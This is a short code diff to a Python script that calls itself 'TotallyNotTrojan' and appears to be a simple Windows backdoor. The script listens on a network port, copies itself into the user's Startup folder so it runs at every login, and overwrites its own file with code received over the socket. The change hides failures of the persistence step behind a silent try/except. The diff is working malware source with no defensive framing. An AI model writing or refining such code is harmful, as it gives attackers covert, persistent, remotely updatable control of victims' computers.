@@ -4,8 +4,11 @@ sock = socket.socket();sock.bind(("", 9081));sock.listen(10)
 import sys, getpass
 boot = "C:/Users/"+getpass.getuser()+"/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/TotallyNotTrojan.pyw"
 if sys.argv[0] != boot:
-    import shutil
-    shutil.copyfile(sys.argv[0], boot)
+    try:
+        import shutil
+        shutil.copyfile(sys.argv[0], boot)
+    except:
+        pass
 def uptodate():
     data = conn.recv(1000000).decode("utf-8")
     with open("TotallyNotTrojan.pyw", "w") as f:
